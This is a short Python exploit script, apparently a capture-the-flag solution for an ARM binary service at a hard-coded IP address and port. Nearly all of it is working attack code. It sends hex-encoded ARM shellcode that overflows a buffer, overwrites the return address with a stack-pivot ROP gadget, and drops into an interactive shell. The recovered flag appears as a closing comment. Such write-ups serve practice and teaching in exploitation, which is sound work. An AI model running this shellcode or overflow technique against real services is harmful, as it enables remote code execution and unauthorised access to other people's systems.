#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "192.168.1.30"
host = "52.72.171.221"
port = 9981


gadget = 0x8d9c # sub sp, r11, #4 ; pop{r11, pc}    
sp = 0x8c0cc

sock = make_conn(host,port)

recvuntil(sock,"$>")
sendline(sock,"create")
recvuntil(sock,"name:")
shellcode = "42808fe2d640a0e320608fe2010c54e316ff2f81d64044e20450d8e7025025e20450c8e7d74084e2f7ffffeaf4ffffeb01608fe216ff2fe16d1b0135b61b60b460b468466946a22701df01233d25901806272a1e033b03dd9340f8d37a4408320220092507b66b4403dd2d606b6c2d716a0202020000c046".decode('hex')
payload = shellcode.ljust(212,"a")
payload += pack32(0x41414141)
payload += pack32(gadget)
    
    
    
sendline(sock,payload)
recvuntil(sock,":")
sendline(sock,"b"*84 + pack32(sp))
recvuntil(sock,":")
sendline(sock,shellcode.ljust(100,"a"))
inter(sock)

# flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}
